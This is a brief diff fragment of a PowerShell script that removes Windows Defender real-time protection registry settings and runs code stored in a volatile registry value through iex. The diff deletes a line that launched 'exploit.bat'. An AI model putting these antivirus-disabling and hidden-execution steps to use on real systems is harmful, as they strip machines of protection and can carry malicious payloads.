@@ -120,4 +120,3 @@ rp ($wdp+'\Real-Time Protection') RealtimeScanDirection -Force -ea 0            
 
 '@ -Force -ea 0; iex((gp Registry::HKEY_Users\S-1-5-21*\Volatile* ToggleDefender -ea 0)[0].ToggleDefender)
 #-_-# hybrid script, can be pasted directly into powershell console
-start exploit.bat
